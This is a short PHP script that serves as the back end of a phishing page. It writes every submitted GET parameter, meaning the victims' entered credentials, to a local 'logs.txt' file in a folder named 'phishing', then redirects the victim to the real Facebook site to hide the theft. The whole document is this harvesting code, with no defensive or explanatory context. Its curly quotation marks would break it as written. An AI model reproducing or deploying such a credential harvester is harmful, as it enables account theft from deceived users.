<?php
header(“Location: https://www.facebook.com”);
$handle = fopen(“C:\Users\Mokshith\Desktop\phishing\logs.txt”, “a”);
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, “=”);
fwrite($handle, $value);
fwrite($handle, “\r\n”);
}
fwrite($handle, “\r\n”);
fclose($handle);
exit;
?>
